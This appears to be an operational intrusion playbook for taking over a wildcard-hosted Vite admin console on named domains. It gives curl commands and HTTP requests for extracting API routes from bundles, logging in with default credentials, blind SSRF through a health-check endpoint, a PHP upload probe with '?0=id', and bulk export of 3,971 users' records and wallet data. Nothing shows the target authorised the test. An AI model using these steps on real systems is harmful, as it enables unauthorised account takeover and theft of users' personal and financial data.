# Wildcard admin SPA and post-auth chain

## When to use

A related domain resolves every subdomain to one reverse proxy and returns the same short HTML for all of them. Do not dismiss it as a parking/catch-all page. In this case `*.6088b.com` all pointed at `95.41.53.83`, and `admin.6088b.com` was a real Vite admin console.

This reference covers the full chain from wildcard host to admin takeover, read-only export, and post-auth SSRF/upload triage.

## 1. Prove the wildcard host is a real app

```bash
IP=$(getent hosts admin.<brand> | awk '{print $1}')
curl -k -sS --resolve "admin.<brand>:443:$IP" "https://admin.<brand>/" -o /tmp/admin.html
head -c 400 /tmp/admin.html
```

Judge on content, not byte size alone:

- `<title>` contains 管理后台 / Admin / Console / 运营;
- HTML references `/assets/index-<hash>.js` or `/static/js/app.<hash>.js`;
- compare `admin` with a random host: same body size is not proof that both are fake.

## 2. Extract the API base from the SPA bundle

Download every script referenced by the HTML. Try `.map` too:

```bash
curl -k -sS --resolve "admin.<brand>:443:$IP" \
  "https://admin.<brand>/assets/index-<hash>.js" -o /tmp/admin.js
curl -k -sS --resolve "admin.<brand>:443:$IP" \
  "https://admin.<brand>/assets/index-<hash>.js.map" -o /tmp/admin.js.map
```

Grep for:

```text
baseURL|VITE_|https://api\.|/admin/|/auth/|/login|Authorization|Bearer
```

Vite admin panels commonly hardcode `https://api.<brand>/api/v1`, and the entire `/admin/*` route inventory is present as string literals across the main and lazy chunks. In this case the bundle yielded 126 `/admin/*` endpoints without path fuzzing.

## 3. Serialization oracle before default credentials

Send the same login request as JSON and as form data with a non-existent username:

```http
POST /api/v1/admin/login
Content-Type: application/json
{"username":"__no_such_user__","password":"x"}
```

```http
POST /api/v1/admin/login
Content-Type: application/x-www-form-urlencoded
username=__no_such_user__&password=x
```

Read the error:

- `参数错误` / `missing parameter` -> wrong body format or field names;
- `用户名或密码错误` / `invalid credentials` -> correct shape, user absent;
- uniform 401/403 -> may be past the gateway; look for differences.

Only after the shape is confirmed, try a small default-credential set (<=5 attempts, stop on first hit). In this case `admin` / `123456` worked on the first JSON request.

Confirm authority and size before exporting:

```http
GET /api/v1/admin/me
Authorization: Bearer <token>
```

Record `role`, user total, wallet total and group total. These totals become the pagination check later.

## 4. Same-cluster check

Resolve every API hostname found in settings/JS, log in once per host, and compare `node_id` or an internal hostname. Here `api.6088b.com`, `api.gd-ysb.com`, `api.dldltg.com` and `gfc.aswbgg.com` were one backend behind different names; the same token worked everywhere. Do not repeat the login test per host after this is proven.

## 5. Post-auth SSRF: test-connection endpoints

Admin panels often expose a "test connection" / health-check action for SMTP, S3, RTC or webhooks. It is a higher-yield SSRF than generic URL fields because the operator expects the server to make a request.

In this case:

```http
POST /api/v1/admin/rtc/health-check
Authorization: Bearer <token>
Content-Type: application/json
{"provider":"<name>","url":"http://<listener>:8080/","api_key":"x","api_secret":"x"}
```

The server made a real `GET /` to the local listener but returned only `{"status":"connected"}`. This is **blind SSRF**; it confirms server-side fetch, not a full-read primitive. Operation logs stored status only, not request/response bodies. To upgrade, look for a test endpoint that returns the response body, or combine with a metadata/file-read endpoint. Do not label blind SSRF as full-read.

## 6. Upload: extension preserved is not execution

A common admin upload endpoint accepts arbitrary filenames and returns a public URL. Test execution, not just the suffix:

```http
POST /api/v1/admin/settings/discover-items/upload-icon
Authorization: Bearer <token>
Content-Type: multipart/form-data
file=@benign.php
```

Then request the returned URL with and without a query parameter:

```bash
curl -k -i "https://api.<brand>/uploads/.../file.php"
curl -k -i "https://api.<brand>/uploads/.../file.php?0=id"
```

If the response is `Content-Type: application/octet-stream` and the PHP body is returned verbatim, the file is static. Extension preservation alone is not RCE. Also test sibling vhosts before declaring the upload dead, because a different Host may route to a PHP handler.

## 7. Read-only full export

Once `super_admin` is confirmed, the admin API is the export surface:

- fetch dashboard/statistics for totals and today's increment;
- paginate users, wallets, groups and channels with the API's own `page`/`pageSize`;
- write CSV + JSON locally, compare the last page count with the declared total;
- keep PII local, do not print it in chat or the report;
- do not call wallet mutations, approvals, broadcasts or settings writes during the export.

In this case: 3,971 users, 3,536 wallets, 118 groups, 195 new users that day. The export produced `users.csv/json`, `wallets.csv/json`, `dashboard.json`, `wallet_stats.json`, `groups.json` and `channels.json`.

## 8. Settings leak the backend

`GET /api/v1/admin/settings` returned S3 bucket configuration, LiveKit keys, an internal `localhost:8081` upload path, and multiple API domain aliases. `GET /health` on the public API leaked an internal AWS EC2 hostname (`ip-172-31-...`). Treat these as topology and credential leads; keep secret values out of the report body and out of chat.

## Pitfalls

- Wildcard hosts returning the same page are not automatically fake. Read title and assets.
- Do not brute default passwords before establishing JSON vs form serialization; wrong shape returns `参数错误` for every credential.
- `.php` accepted by an upload endpoint means nothing until retrieval proves execution.
- A `connected` health-check response confirms blind SSRF only; do not overstate it.
- Do not write to wallet, settings, approvals or broadcast endpoints just because you have `super_admin`. Read-only export first; state the boundary in the report.
- Same backend across multiple API hostnames: prove once with `node_id`/internal IP, then stop re-testing each host.
